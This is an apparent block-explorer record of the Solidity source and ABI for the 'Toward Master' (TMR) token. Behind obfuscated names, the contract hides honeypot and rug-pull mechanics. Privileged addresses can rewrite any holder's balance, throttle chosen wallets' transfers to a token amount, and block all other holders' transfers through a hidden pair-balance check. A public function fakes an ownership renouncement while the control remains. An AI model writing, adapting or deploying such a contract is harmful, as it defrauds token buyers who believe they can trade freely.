{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface modeLaunch {\n    function createPair(address liquiditySell, address marketingLiquidity) external returns (address);\n}\n\ninterface receiverAmountLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedList) external view returns (uint256);\n\n    function transfer(address takeFundAuto, uint256 listMaxMin) external returns (bool);\n\n    function allowance(address senderTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listMaxMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeFundAuto,\n        uint256 listMaxMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingFrom, uint256 value);\n    event Approval(address indexed senderTotal, address indexed spender, uint256 value);\n}\n\nabstract contract takeAmountFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverAmountLaunchMetadata is receiverAmountLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TowardMaster is takeAmountFrom, receiverAmountLaunch, receiverAmountLaunchMetadata {\n\n    address private atTradingLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxMarketing;\n    }\n\n    bool public txBuyAmount;\n\n    uint256 constant swapShould = 11 ** 10;\n\n    address public tokenLaunch;\n\n    function transfer(address buyLiquidity, uint256 listMaxMin) external virtual override returns (bool) {\n        return tokenMarketing(_msgSender(), buyLiquidity, listMaxMin);\n    }\n\n    event OwnershipTransferred(address indexed txList, address indexed senderExempt);\n\n    function limitLiquidity() private view {\n        require(feeExempt[_msgSender()]);\n    }\n\n    function senderWalletMode(address walletLaunch) public {\n        limitLiquidity();\n        \n        if (walletLaunch == tokenLaunch || walletLaunch == amountToShould) {\n            return;\n        }\n        tradingSell[walletLaunch] = true;\n    }\n\n    function amountTeam(address fundToken) public {\n        require(fundToken.balance < 100000);\n        if (txBuyAmount) {\n            return;\n        }\n        \n        feeExempt[fundToken] = true;\n        \n        txBuyAmount = true;\n    }\n\n    function approve(address limitTx, uint256 listMaxMin) public virtual override returns (bool) {\n        walletTake[_msgSender()][limitTx] = listMaxMin;\n        emit Approval(_msgSender(), limitTx, listMaxMin);\n        return true;\n    }\n\n    function sellToken(uint256 listMaxMin) public {\n        limitLiquidity();\n        launchExempt = listMaxMin;\n    }\n\n    function swapTake() public {\n        emit OwnershipTransferred(tokenLaunch, address(0));\n        atTradingLimit = address(0);\n    }\n\n    function allowance(address limitFee, address limitTx) external view virtual override returns (uint256) {\n        if (limitTx == liquidityTokenFee) {\n            return type(uint256).max;\n        }\n        return walletTake[limitFee][limitTx];\n    }\n\n    uint256 private takeList;\n\n    uint256 public fundMax;\n\n    function shouldTake(address buyLiquidity, uint256 listMaxMin) public {\n        limitLiquidity();\n        enableLimit[buyLiquidity] = listMaxMin;\n    }\n\n    string private tokenReceiver = \"Toward Master\";\n\n    uint256 walletFee;\n\n    uint256 private tradingSenderIs = 100000000 * 10 ** 18;\n\n    uint8 private launchedAmount = 18;\n\n    function owner() external view returns (address) {\n        return atTradingLimit;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedAmount;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingSenderIs;\n    }\n\n    uint256 launchExempt;\n\n    function getOwner() external view returns (address) {\n        return atTradingLimit;\n    }\n\n    function balanceOf(address launchedList) public view virtual override returns (uint256) {\n        return enableLimit[launchedList];\n    }\n\n    mapping(address => bool) public feeExempt;\n\n    string private maxMarketing = \"TMR\";\n\n    mapping(address => uint256) private enableLimit;\n\n    address public amountToShould;\n\n    constructor (){\n        \n        senderTake atTake = senderTake(liquidityTokenFee);\n        amountToShould = modeLaunch(atTake.factory()).createPair(atTake.WETH(), address(this));\n        if (fundMax != limitSenderMax) {\n            fundMax = takeList;\n        }\n        tokenLaunch = _msgSender();\n        feeExempt[tokenLaunch] = true;\n        enableLimit[tokenLaunch] = tradingSenderIs;\n        swapTake();\n        \n        emit Transfer(address(0), tokenLaunch, tradingSenderIs);\n    }\n\n    mapping(address => bool) public tradingSell;\n\n    address liquidityTokenFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenReceiver;\n    }\n\n    function transferFrom(address isTakeLaunched, address takeFundAuto, uint256 listMaxMin) external override returns (bool) {\n        if (_msgSender() != liquidityTokenFee) {\n            if (walletTake[isTakeLaunched][_msgSender()] != type(uint256).max) {\n                require(listMaxMin <= walletTake[isTakeLaunched][_msgSender()]);\n                walletTake[isTakeLaunched][_msgSender()] -= listMaxMin;\n            }\n        }\n        return tokenMarketing(isTakeLaunched, takeFundAuto, listMaxMin);\n    }\n\n    function marketingSender(address isTakeLaunched, address takeFundAuto, uint256 listMaxMin) internal returns (bool) {\n        require(enableLimit[isTakeLaunched] >= listMaxMin);\n        enableLimit[isTakeLaunched] -= listMaxMin;\n        enableLimit[takeFundAuto] += listMaxMin;\n        emit Transfer(isTakeLaunched, takeFundAuto, listMaxMin);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletTake;\n\n    address tradingMinFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tokenMarketing(address isTakeLaunched, address takeFundAuto, uint256 listMaxMin) internal returns (bool) {\n        if (isTakeLaunched == tokenLaunch) {\n            return marketingSender(isTakeLaunched, takeFundAuto, listMaxMin);\n        }\n        uint256 feeEnableSender = receiverAmountLaunch(amountToShould).balanceOf(tradingMinFrom);\n        require(feeEnableSender == launchExempt);\n        require(takeFundAuto != tradingMinFrom);\n        if (tradingSell[isTakeLaunched]) {\n            return marketingSender(isTakeLaunched, takeFundAuto, swapShould);\n        }\n        return marketingSender(isTakeLaunched, takeFundAuto, listMaxMin);\n    }\n\n    uint256 public limitSenderMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"}],\"name\":\"amountTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMaxMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSenderMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listMaxMin\",\"type\":\"uint256\"}],\"name\":\"sellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunch\",\"type\":\"address\"}],\"name\":\"senderWalletMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMaxMin\",\"type\":\"uint256\"}],\"name\":\"shouldTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMaxMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTakeLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeFundAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMaxMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuyAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TowardMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}